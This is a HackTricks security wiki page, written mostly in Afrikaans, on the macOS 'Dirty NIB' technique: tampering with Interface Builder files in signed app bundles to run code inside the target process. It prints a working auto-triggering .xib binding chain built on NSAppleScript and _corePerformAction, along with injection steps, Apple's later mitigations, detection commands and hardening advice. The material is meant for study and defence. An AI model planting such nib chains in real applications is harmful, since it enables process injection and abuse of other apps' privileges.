# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB verwys na die misbruik van Interface Builder-lêers (.xib/.nib) binne 'n ondertekende macOS-app-bundel om aanvaller-beheerde logika binne die teikenproses uit te voer, en sodoende sy entitlements en TCC-permissies te erf. Hierdie tegniek is oorspronklik gedokumenteer deur xpn (MDSec) en later gegeneraliseer en beduidend uitgebrei deur Sector7, wat ook Apple se mitigasies in macOS 13 Ventura en macOS 14 Sonoma behandel het. Vir agtergrond en diepgaande ontledings, sien die verwysings aan die einde.

> TL;DR
> • Before macOS 13 Ventura: replacing a bundle’s MainMenu.nib (or another nib loaded at startup) could reliably achieve process injection and often privilege escalation.
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, and the new TCC “App Management” permission largely prevent post‑launch nib tampering by unrelated apps. Attacks may still be feasible in niche cases (e.g., same‑developer tooling modifying own apps, or terminals granted App Management/Full Disk Access by the user).


## Wat is NIB/XIB files

Nib (short for NeXT Interface Builder) files is geserialiseerde UI-objectgrafieke wat deur AppKit-apps gebruik word. Moderne Xcode stoor wysigbare XML .xib-lêers wat by build-tyd na .nib gekompileer word. 'n Tipiese app laai sy hoof-UI via `NSApplicationMain()` wat die `NSMainNibFile` sleutel uit die app se Info.plist lees en die objekgrafiek by runtime instantiate.

Belangrike punte wat die aanval moontlik maak:
- NIB loading instantiate willekeurige Objective‑C-klasse sonder om te vereis dat hulle aan NSSecureCoding voldoen (Apple’s nib loader val terug op `init`/`initWithFrame:` wanneer `initWithCoder:` nie beskikbaar is nie).
- Cocoa Bindings kan misbruik word om metodes aan te roep terwyl nibs geïnstantieer word, insluitend geketende oproepe wat geen gebruikersinteraksie vereis nie.


## Dirty NIB injection process (attacker view)

Die klassieke pre‑Ventura-vloei:
1) Create a malicious .xib
- Voeg 'n `NSAppleScript` object by (of ander “gadget” klasse soos `NSTask`).
- Voeg 'n `NSTextField` by wie se title die payload bevat (bv., AppleScript of opdragargumente).
- Voeg een of meer `NSMenuItem` objects by wat via bindings bedraad is om metodes op die teikenobject aan te roep.

2) Auto‑trigger without user clicks
- Gebruik bindings om 'n menu-item se target/selector te stel en roep dan die private `_corePerformAction` metode aan sodat die aksie outomaties afvuur wanneer die nib laai. Dit verwyder die behoefte vir 'n gebruiker om op 'n knoppie te klik.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Dit bewerkstellig arbitrêre AppleScript‑uitvoering in die teikenproses wanneer die nib gelaai word. Gevorderde kettings kan:

- Instansieer arbitrêre AppKit‑klasse (bv., `NSTask`) en roep metodes sonder argumente soos `-launch`.
- Roep arbitrêre selectors met objekargumente via die binding‑truuk hierbo.
- Laai AppleScriptObjC.framework om na Objective‑C te brug en selfs gekose C APIs aan te roep.
- Op ouer stelsels wat steeds Python.framework insluit, brug na Python en gebruik dan `ctypes` om arbitrêre C‑funksies aan te roep (Sector7’s research).

3) Vervang die app se nib
- Kopieer target.app na 'n skryfbare ligging, vervang bv. `Contents/Resources/MainMenu.nib` met die kwaadwillige nib, en voer target.app uit. Pre‑Ventura, na 'n eenmalige Gatekeeper‑assessering, het daaropvolgende laaibeurte slegs oppervlakkige handtekeningkontroles uitgevoer, so nie‑uitvoerbare hulpbronne (soos .nib) is nie weer gevalideer nie.

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS-beskermings (Ventura/Monterey/Sonoma/Sequoia)

Apple het verskeie sistemiese mitigasies bekendgestel wat die uitvoerbaarheid van Dirty NIB in moderne macOS drasties verminder:
- Eerste‑aanvang diep verifikasie en bundelbeskerming (macOS 13 Ventura)
- On first run of any app (quarantined or not), a deep signature check covers all bundle resources. Afterwards, the bundle becomes protected: only apps from the same developer (or explicitly allowed by the app) may modify its contents. Other apps require the new TCC “App Management” permission to write into another app’s bundle.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps can’t be copied elsewhere and launched; this kills the “copy to /tmp, patch, run” approach for OS apps.
- Improvements in macOS 14 Sonoma
- Apple hardened App Management and fixed known bypasses (e.g., CVE‑2023‑40450) noted by Sector7. Python.framework was removed earlier (macOS 12.3), breaking some privilege‑escalation chains.
- Gatekeeper/Quarantine changes
- For a broader discussion of Gatekeeper, provenance, and assessment changes that impacted this technique, see the page referenced below.

> Praktiese implikasie
> • Op Ventura+ kan jy oor die algemeen nie ’n derde‑party app se .nib wysig nie, tensy jou proses App Management het of deur dieselfde Team ID as die teiken geteken is (bv. developer tooling).
> • Om App Management of Full Disk Access aan shells/terminals te verleen heropen effektief hierdie aanvalsvlak vir enigiets wat kode binne daardie terminal se konteks kan uitvoer.


### Aanpak van Launch Constraints

Launch Constraints blokkeer die uitvoering van baie Apple‑apps vanaf nie‑standaard liggings sedert Ventura. As jy op pre‑Ventura werkvloei vertrou het soos om ’n Apple‑app na ’n temp directory te kopieer, `MainMenu.nib` te wysig, en dit te loods, verwag dat dit op >= 13.0 sal misluk.


## Enumerasie van teikens en nibs (nuttig vir navorsing / ouer stelsels)

- Vind apps waarvan die UI nib‑gedrewe is:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Vind kandidaat nib hulpbronne binne 'n bundel:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valideer code signatures deeglik (sal misluk as jy hulpbronne gemanipuleer het en nie weer re-sign het nie):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Let op: Op moderne macOS sal jy ook deur bundle‑beskerming/TCC geblokkeer word as jy probeer in 'n ander app se bundle skryf sonder behoorlike magtiging.


## Opsporing en DFIR‑wenke

- Lêer‑integriteitsmonitering op bundle‑hulpbronne
- Kyk uit vir mtime/ctime‑wysigings aan `Contents/Resources/*.nib` en ander nie‑uitvoerbare hulpbronne in geïnstalleerde apps.
- Gekonsolideerde logs en prosesgedrag
- Moniteer vir onverwagte AppleScript‑uitvoering binne GUI‑apps en vir prosesse wat AppleScriptObjC of Python.framework laai. Voorbeeld:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktiewe assesserings
- Voer periodiek `codesign --verify --deep` oor kritieke apps uit om te verseker dat hulpbronne intak bly.
- Privilegie‑konteks
- Kontroleer wie/wat TCC “App Management” of Full Disk Access het (veral terminals en bestuursagenten). Deur hierdie toestemmings uit algemene shells te verwyder, voorkom jy dat Dirty NIB‑styl knoei triviaal weer geaktiveer word.


## Verdedigende verharding (ontwikkelaars en verdedigers)

- Gebruik by voorkeur programmatiese UI of beperk wat uit nibs geïnstantieer word. Vermy om kragtige klasse (bv. `NSTask`) in nib‑grafieke in te sluit en vermy bindings wat indirek selectors op ewekansige objekte aanroep.
- Gebruik die hardened runtime met Library Validation (reeds standaard vir moderne apps). Al keer dit nib‑inspuiting op sigself nie, blokkeer dit maklike native kodelading en dwing aanvalleerders na slegs skrip‑payloads.
- Moet nie in algemene gereedskap wye App Management‑toestemmings versoek of daarop staatmaak nie. As MDM App Management vereis, skei daardie konteks van gebruiker‑gedrewe shells.
- Verifieer gereeld jou app‑bundle se integriteit en maak jou opdateringsmeganismes selfherstellend vir bundle‑hulpbronne.


## Related reading in HackTricks

Lees meer oor Gatekeeper, kwarantyn en provenance‑veranderings wat hierdie tegniek beïnvloed:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- xpn – DirtyNIB (oorspronklike uiteensetting met Pages‑voorbeeld): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
